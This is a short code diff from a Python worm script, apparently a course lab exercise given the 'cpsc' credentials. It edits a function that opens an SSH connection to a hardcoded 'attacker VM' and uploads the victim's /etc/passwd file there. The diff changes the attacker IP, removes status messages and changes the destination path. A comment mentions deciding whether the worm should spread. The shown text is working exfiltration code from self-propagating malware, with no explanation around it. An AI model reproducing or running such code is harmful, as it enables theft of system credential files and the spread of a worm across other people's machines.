@@ -21,15 +21,11 @@ def copyPasswd():
 	sshClient = paramiko.SSHClient()
 	sshClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 	
-	print("Connecting to attacker VM.")
-	
 	# Hardcoded attacker VM IP-Address. (Change to match your attacker VM IP-Address)
-	sshClient.connect("192.168.1.5", username="cpsc", password="cpsc")
-	
-	print("Sending passwd file to attacker VM.")
+	sshClient.connect("192.168.1.6", username="cpsc", password="cpsc")
 	
 	sftpClient = sshClient.open_sftp()
-	sftpClient.put("/etc/passwd", "/etc/passwd_" + getMyIP())
+	sftpClient.put("/etc/passwd", "/tmp/passwd_" + getMyIP())
 
 ##################################################################
 # Returns whether the worm should spread
